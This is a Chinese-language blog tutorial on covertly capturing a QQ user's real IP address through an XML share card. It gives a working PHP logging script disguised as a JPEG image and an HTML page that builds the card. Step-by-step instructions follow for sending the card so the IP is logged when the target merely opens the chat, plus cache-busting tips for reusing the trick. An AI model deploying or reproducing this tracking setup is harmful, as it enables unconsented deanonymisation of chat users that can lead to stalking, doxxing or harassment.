---
title: 利用QQ XML卡片获取真实IP
date: 2024-11-11 13:44:24
categories: [技术, 安全, 开源情报]
tags: [PHP]
---

<b>前言：</b>QQ提供了一个卡片功能：在QQ内打开一个网页后，点右上角分享可以把此网页分享到任意群聊或好友。这种分享和直接发链接的区别是，对方在聊天框看到的不是链接文本，而是一张包含了网站缩略图、站点标题和摘要的xml卡片。分享后，对方一旦点开聊天窗口窥屏，这个卡片（还有它身上的图片）就会被显示出来，等于此人访问了站点上的一张图片。基于此原理，我们有希望在对方完全不点击链接的情况下获取对方IP地址。

<!--more-->

## 一、攻击环境搭建

这里使用的攻击环境如下：

* <b>Ubuntu</b> 22.04 <b>VPS</b>
* <b>Apache</b> 2.4.52 (Ubuntu)
* <b>PHP</b> 8.1.2-1ubuntu2.18

为了创建一张QQ卡片，我们需要一个http网站来存放攻击脚本。方便起见，这里假设你已经有了一个配置好的Apache网页服务器。

首先在网站的根目录内创建攻击脚本iptest.php如下：

```php
<?php 

    //防注入函数
    function filter_dangerous_words($str){
        $str = str_replace("'", "‘", $str);
        $str = str_replace("\"", "“", $str);
        $str = str_replace("<", "《", $str);
        $str = str_replace(">", "》", $str);
        return $str;
    }
    
    //获取真实IP函数
    function getIP() {
        if (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
        }
        elseif (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
        }
        elseif (getenv('HTTP_X_FORWARDED')) {
        $ip = getenv('HTTP_X_FORWARDED');
        }
        elseif (getenv('HTTP_FORWARDED_FOR')) {
        $ip = getenv('HTTP_FORWARDED_FOR');
 
        }
        elseif (getenv('HTTP_FORWARDED')) {
        $ip = getenv('HTTP_FORWARDED');
        }
        else {
        $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }
 
    //生成输出内容
    $ip = getIP();
    @$referer = $_SERVER['HTTP_REFERER']."\r\n";
    $ua = $_SERVER['HTTP_USER_AGENT']."\r\r";
    date_default_timezone_set("Asia/Shanghai");
    $date_ = date("Y.m.d,h:i:sa")."\r\n";
    
    //输出为hack.txt文件
    $hack = 'date: '.$date_.'ip:'.$ip."\r\n".'referer: '.$referer.'ua: '.$ua;
    $hack = filter_dangerous_words($hack);
    $op = fopen('hack.txt','a+');
    fwrite($op,$hack);
    fclose($op);
	  
	  //将此php文件伪装为一张jpg图片
	  //这样php返回的图片就会是同目录下的icon.jpg文件。
	$im = imagecreatefromjpeg("icon.jpg");
    header('Content-Type: image/jpeg');
    imagejpeg($im);
    imagedestroy($im);
 ?>
```

然后，为了生成卡片，我们还需要制作一个简单的网页iptest.html（与iptest.php、icon.jpg这两个文件处于同一个目录下），该网页的内容就是卡片上的内容：

```html
<!DOCTYPE html>
<html>
<head>
	<meta itemprop="name" content="XML卡片标题" />
	<meta itemprop="description" content="XML卡片描述" />
	<meta itemprop="image" content="文件路径，本例中为iptest.php?abcdefg" />
	<title>标题</title>
</head>
<body>
</body>
</html>
```

这里需要注意的是，iptest.php文件链接需要在其后带一串无效参数才能正常转换为短链接，此处用了abcdefg。因为qq分享机制的原因，导致直接分享出去的xml卡片会先将图片地址转换为腾讯的图床，所以探测链接不会生效。

在两个文件上传服务器之后，确保再上传一张命名为icon.jpg的图片文件就配置完毕了。

## 二、攻击方法

出于方便，攻击时不采用QQ插件发送方式，而采用直接分享生成的XML卡片。步骤如下：

1. 首先qq内打开iptest.html文件的链接，点击右上角，此时还未选择分享方式，未获取到ip；
2. 然后点击“好友”，到达选择好友界面，此时云端生成xml卡片，iptest.php文件链接被转换为腾讯短链，获取到了短链服务器的ip；
3. 选择好友，确认是否发送，本机预览消息，此时获取到本机ip；
4. 点击发送，聊天记录漫游到服务器，此时获取到腾讯服务器ip；
5. 目标点开聊天记录，自动读取了xml卡片，此时获取到目标ip。

上面说明获取顺序的时候，是按操作顺序写的，实际上获取到的服务器ip记录时间不一定按照你的操作顺序记录。但因为目标是最后一个收到的，所以最后一个基本就是目标ip。不排除特殊情况，需要随机应变。鉴于单次攻击会获取到多个ip，记得每一次探测后删除hack.txt文件或改名，以免下一次使用时搞混。

## 三、Q&A

<b>Q：</b>配置好攻击环境后能反复使用，以在hack.txt中记录多个目标ip吗？

<b>A：</b>不能。攻击链接是一次性的。

首先是所有的链接都会受到缓存的限制，所以一个iptest.php链接只能对一个目标生效一次，可以通过修改后面的无效参数（刚才的abcdef）来更新缓存。

其次就是某些时候iptest.html文件链接在qq内打开时会存在该页面本身被缓存的情况，导致iptest.php文件链接不会更新，缓存自然不会更新，所以无法成功获取ip，这种情况下hack.txt不会记录ip，所以比较好判断。可以通过更改iptest.html文件名来更新页面的缓存。
